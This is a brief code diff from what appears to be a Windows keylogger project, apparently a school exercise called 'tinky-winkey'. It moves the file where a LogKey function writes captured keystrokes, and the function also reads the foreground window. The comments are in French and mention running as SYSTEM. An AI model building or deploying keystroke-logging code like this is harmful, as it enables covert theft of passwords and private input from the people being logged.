@@ -15,7 +15,7 @@ void LogKey(const char* keyOutput) {
     // Ouvert en mode "append" (ajout à la fin). 
     // Chemin absolu car exécuté par SYSTEM sans dossier de travail prévisible.
     // Mais du coup il faut que le fichier existe deja ? TODO
-    FILE* file = fopen("C:\\ProgramData\\winkey.log", "a");
+    FILE* file = fopen("C:\\Users\\Hadri\\Desktop\\42\\tinky-winkey\\winkey.log", "a");
     if (!file) return;
 
     HWND currentWindow = GetForegroundWindow();
